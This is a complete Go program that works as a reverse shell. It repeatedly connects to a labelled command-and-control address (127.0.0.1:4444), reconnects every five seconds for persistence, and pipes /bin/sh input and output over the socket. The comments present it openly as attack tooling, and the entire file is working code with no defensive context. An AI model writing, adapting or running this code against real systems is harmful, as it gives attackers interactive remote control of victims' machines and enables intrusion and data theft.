package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	// The C2 (Command & Control) server address
	target := "127.0.0.1:4444"

	for {
		// Attemp to establish a connection with the target
		conn, err := net.Dial("tcp", target)

		if err != nil {
			// If connection fails, wait 5 seconds before retrying (Persistence)
			time.Sleep(5 * time.Second)
			continue
		}

		// Once connected, spawn the sell process
		// In Linux, we use /bin/sh or /bin/bash
		cmd := exec.Command("/bin/sh")

		// Redirect Standard Streams (Input, Output, and Error) to the network connection
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn

		// Execute the command and block execution until the session is closed
		cmd.Run()

		// Ensure the connection is closed before attempting to reconnect
		conn.Close()
	}
}
